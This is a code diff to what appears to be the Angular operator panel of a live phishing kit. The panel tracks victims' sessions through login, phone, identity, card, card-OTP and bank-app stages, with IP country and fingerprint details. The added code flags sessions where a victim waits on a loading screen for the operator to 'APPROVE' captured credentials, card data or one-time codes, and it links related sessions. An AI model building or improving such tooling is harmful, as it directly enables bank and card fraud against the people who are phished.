@@ -142,7 +142,14 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                     <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
                                                 }
                                              </div>
-                                             <span class="text-sm font-bold text-slate-700 dark:text-slate-300 truncate">{{ getDisplayEmail(session.email) }}</span>
+                                             <div class="flex items-center justify-between w-full">
+                                                <span class="text-sm font-bold text-slate-700 dark:text-slate-300 truncate">{{ getDisplayEmail(session.email) }}</span>
+                                                @if(getActionBadge(session)) {
+                                                    <span class="bg-red-500 text-white text-[9px] font-bold px-1.5 py-0.5 rounded animate-pulse ml-2 whitespace-nowrap">
+                                                        {{ getActionBadge(session) }}
+                                                    </span>
+                                                }
+                                             </div>
                                          </div>
                                      </div>
                                      }
@@ -1288,5 +1295,32 @@ ${session.fingerprint?.userAgent}
       if (t === 'amex') return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
       if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
       return '';
+  }
+
+  getActionBadge(session: any): string | null {
+      // Only show badge if user is waiting (loading screen)
+      if (session.currentView !== 'loading') return null;
+
+      switch (session.stage) {
+          case 'login': return 'APPROVE LOGIN';
+          case 'phone_pending': return 'APPROVE PHONE';
+          case 'personal_pending': return 'APPROVE IDENTITY';
+          case 'card_pending': return 'APPROVE CARD';
+          case 'card_otp_pending': return 'APPROVE OTP';
+          case 'bank_app_pending': return 'APPROVE APP';
+          default: return 'ACTION NEEDED';
+      }
+  }
+
+  viewLinkedSession() {
+      const linkedId = this.monitoredSession()?.data?.linkedSessionId;
+      if (!linkedId) return;
+
+      const found = this.state.history().find(h => h.id === linkedId);
+      if (found) {
+          this.viewHistory(found);
+      } else {
+          this.state.showAdminToast('Linked session not found in history');
+      }
   }
 }
